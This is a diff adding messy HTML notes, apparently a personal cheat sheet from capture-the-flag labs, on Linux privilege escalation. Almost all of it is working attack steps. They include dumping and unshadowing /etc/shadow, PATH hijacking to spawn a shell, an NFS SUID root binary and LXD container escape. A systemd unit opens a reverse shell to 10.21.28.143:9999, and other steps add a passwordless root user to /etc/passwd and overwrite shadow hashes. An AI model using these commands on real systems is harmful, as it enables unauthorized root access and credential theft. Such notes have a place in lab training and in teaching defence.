@@ -1,0 +1,216 @@
+<h1 id="-linux-">... LINUX ...</h1>
+<h2 id="hostname">hostname</h2>
+<ul>
+<li><p>in some cases, it can provide information about the target system’s role within the corporate network</p>
+<h2 id="uname-a">uname -a</h2>
+<ul>
+<li>This will be useful when searching for any potential kernel vulnerabilities that could lead to privilege escalation.</li>
+</ul>
+<h2 id="-proc-version">/proc/version</h2>
+</li>
+<li><p>The proc filesystem (procfs) provides information about the target system processes.Looking at /proc/version may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.</p>
+<h2 id="-etc-issue">/etc/issue</h2>
+</li>
+<li><p>Systems can also be identified by looking at the /etc/issue file. </p>
+<h2 id="ps-ps-a-ps-axjf">ps  &amp; ps -A &amp; ps axjf</h2>
+</li>
+<li><p>The ps command is an effective way to see the running processes on a Linux system.     </p>
+<h2 id="ss-for-open-port">ss for open port</h2>
+</li>
+<li><p>ss -anp</p>
+<h2 id="env">env</h2>
+</li>
+<li><p>The env command will show environmental variables.   </p>
+<h2 id="sudo-l">sudo -l</h2>
+</li>
+<li><p>The sudo -l command can be used to list all commands your user can run using sudo.</p>
+<h2 id="-etc-passwd">/etc/passwd</h2>
+</li>
+<li><p>Reading the /etc/passwd file can be an easy way to discover users on the system.
+  <code>cat /etc/passwd | cut -d ":" -f 1</code>
+  <code>cat /etc/passwd | grep home</code></p>
+<h2 id="netstat">netstat</h2>
+</li>
+<li><p>netstat -tlnp</p>
+<h2 id="find">find</h2>
+</li>
+<li><p><strong>find / -perm -u=s -type f 2&gt;/dev/null</strong>  : find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user. </p>
+</li>
+<li><p>find / -name config.php 2&gt;/dev/null </p>
+<h2 id="cat-etc-shadow">cat /etc/shadow</h2>
+</li>
+<li><p>This file stores the encrypted password hashes for user accounts on the system.  </p>
+<h2 id="debian-glibc">Debian GLIBC</h2>
+</li>
+<li><p>ldd (Ubuntu GLIBC 2.35-0ubuntu3.1) 2.35</p>
+<p>========================================================================================================</p>
+<h2 id="automation-">Automation..</h2>
+</li>
+<li><p>LinPeas: <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS</a>
+LinEnum: <a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a>
+LES (Linux Exploit Suggester): <a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a>
+Linux Smart Enumeration: <a href="https://github.com/diego-treitos/linux-smart-enumeration">https://github.com/diego-treitos/linux-smart-enumeration</a>
+Linux Priv Checker: <a href="https://github.com/linted/linuxprivchecker">https://github.com/linted/linuxprivchecker</a>   </p>
+<h2 id="1-privilege-escalation-kernel-exploits">1. Privilege Escalation: Kernel Exploits</h2>
+</li>
+<li><p>Linux Kernel CVEs <a href="https://www.linuxkernelcves.com/cves">https://www.linuxkernelcves.com/cves</a>     </p>
+<ul>
+<li>use a script like LES (Linux Exploit Suggester) but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).  </li>
+</ul>
+<p>=========================================================================================================</p>
+<h2 id="2-privilege-escalation-suid">2. Privilege Escalation: <a href="https://gtfobins.github.io/">SUID</a></h2>
+</li>
+<li><p><strong>find / -type f -perm -04000 -ls 2&gt;/dev/null</strong></p>
+<ul>
+<li>will list files that have SUID or SGID bits set.</li>
+</ul>
+<h2 id="base64">base64</h2>
+</li>
+<li><p>base64 /etc/passwd | base64 --decode</p>
+</li>
+<li>base64 /etc/shadow | base64 --decode</li>
+<li>unshadow passwd.txt shadow.txt &gt; passwords.txt</li>
+<li><p>/home/ubuntu/flag3.txt | base64 --decode</p>
+<p>==========================================================================================================</p>
+<h2 id="3-privilege-escalation-capabilities">3. Privilege Escalation: <a href="https://gtfobins.github.io/">Capabilities</a></h2>
+</li>
+<li><p>getcap</p>
+</li>
+<li><h1 id="getcap-r-2-dev-null">getcap -r / 2&gt;/dev/null</h1>
+<h2 id="4-privilege-escalation-cron-jobs">4. Privilege Escalation: Cron Jobs</h2>
+<ul>
+<li>cat /etc/crontab</li>
+</ul>
+<p>==========================================================================================================</p>
+<h2 id="5-privilege-escalation-path">5. Privilege Escalation PATH</h2>
+<ul>
+<li><p>folder you have write access for.</p>
+</li>
+<li><p>echo cat /home/matt/flag6.txt" &gt; thm</p>
+</li>
+<li><p>export PATH=/home/murdoch:$PATH</p>
+</li>
+</ul>
+<p>$%$%$%$%$%$%$%$%$%$%$%$%$%$%$%$$%$%$%$%$% </p>
+<ul>
+<li><p>@see groub bu <code>id</code></p>
+</li>
+<li><p>now in this instance we created a new <code>cat</code> file in /tmp that when ran would spawn a shell.</p>
+</li>
+</ul>
+<blockquote>
+<p>cd /tmp$</p>
+</blockquote>
+<p>echo "/bin/sh" &gt; cat</p>
+<p>chmod +x cat</p>
+<p>export PATH=/tmp:$PATH</p>
+<p>echo $PATH</p>
+<p>run bugtracker</p>
+</li>
+</ul>
+<p> ==========================================================================================================</p>
+<h2 id="6-privilege-escalation-nfs-network-file-sharing-">6. Privilege Escalation NFS (Network File Sharing)</h2>
+<ul>
+<li><p><code>cat  /etc/exports</code> :: The critical element for this privilege escalation vector is the “no_root_squash”.</p>
+</li>
+<li><p>mkdir /tmp/sharedfolder</p>
+</li>
+<li><p>sudo mount -o rw 10.10.114.12:/home/ubuntu/sharedfolder /tmp/sharedfolder</p>
+</li>
+<li><p>nana nfs.c === root_int_shell.c</p>
+</li>
+<li><p>cd /tmp/sharedfolder</p>
+</li>
+<li><p>gcc nfs.c -o nfs -w</p>
+</li>
+<li><p>chmod +s nfs</p>
+</li>
+<li><p>./nfs</p>
+<p>==========================================================================================================</p>
+<h2 id="7-privilege-escalation-lxd-lxc">7. Privilege Escalation Lxd/lxc</h2>
+</li>
+<li><p>git clone <a href="https://github.com/saghul/lxd-alpine-builder">https://github.com/saghul/lxd-alpine-builder</a></p>
+</li>
+<li><p>cd lxd-alpine-builder</p>
+</li>
+<li><p>then fire a server</p>
+</li>
+<li><p>lxd init // victem machine //enter for all//</p>
+</li>
+<li><p>lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias privesc</p>
+</li>
+<li><p>lxc image list //to check</p>
+</li>
+<li><p>lxc init privesc preivesc-container -c security.priviledged=true</p>
+</li>
+<li><p>lxc list   |STOPPED </p>
+</li>
+<li><p>lxc config device add privec-container mydevice disk source=/ path=/mnt/root recursive=true</p>
+</li>
+<li><p>lxc start privesc-container</p>
+</li>
+<li><p>lxc list</p>
+</li>
+<li><p>lxc exec privesc-container /bin/sh </p>
+<p>~# root</p>
+<p>========================================================================================================== </p>
+<h2 id="8-privilege-escalation-metasploit-meterpreter-">8. Privilege Escalation metasploit [Meterpreter.]</h2>
+<ul>
+<li><p>ps</p>
+</li>
+<li><p>migrate $servace_number$</p>
+</li>
+<li><ul>
+<li>search local exploit suggester <strong>$%Don't Forget target id same arch {x86--x64}%$</strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p> ========================================================================================================== </p>
+<h2 id="9-privilege-escalation-systemctl">9. Privilege Escalation systemctl</h2>
+<ul>
+<li><strong>find / -user root -perm -4000 -print 2&gt;/dev/null</strong></li>
+</ul>
+<ul>
+<li><p>make file root.service</p>
+<p> [Unit]
+ Description=roooooooooot</p>
+<p> [Service]
+ Type=simple
+ User=root
+ ExecStart=/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.21.28.143/9999 0&gt;&amp;1'</p>
+<p> [Install]
+ WantedBy=multi-user.target</p>
+</li>
+</ul>
+<ul>
+<li><p>/bin/systemctl enable /tmp/root.service </p>
+</li>
+<li><p>/bin/systemctl start root   </p>
+<p>========================================================================================================== </p>
+<h2 id="10-privilege-escalation-file-give-you-a-permations">10. Privilege Escalation file give you a permations</h2>
+</li>
+<li><p>ln -s /etc/passwd /home/larissa/test</p>
+</li>
+<li>sudo /home/larissa/vic.sh larissa rw /home/larissa/test</li>
+<li>echo "root3::0:0:root3:/root:/bin/bash" &gt;&gt; ./test</li>
+<li><p>su root3</p>
+<p>==========================================================================================================   </p>
+<ul>
+<li>linPEAS  <a href="https://github.com/Cerbersec/scripts/blob/master/linux/linpeas.sh">https://github.com/Cerbersec/scripts/blob/master/linux/linpeas.sh</a></li>
+</ul>
+</li>
+</ul>
+<p> ========================================================================================================== </p>
+<ul>
+<li>find / -type f -name "configurations.php" -exec ls -al {} \; 2&gt;/dev/null </li>
+</ul>
+<p> ========================================================================================================== </p>
+<ul>
+<li>cat /etc/shadow <br></br>
+openssl passwd -1 -salt abc password<br></br>
+$1$abc$BXBqpb9BZcZhXLgbee.0s/  === password<br></br>
+nano /etc/shadow  @@add-new-hash-password<br></br>
+su [root]<br></br> </li>
+</ul>
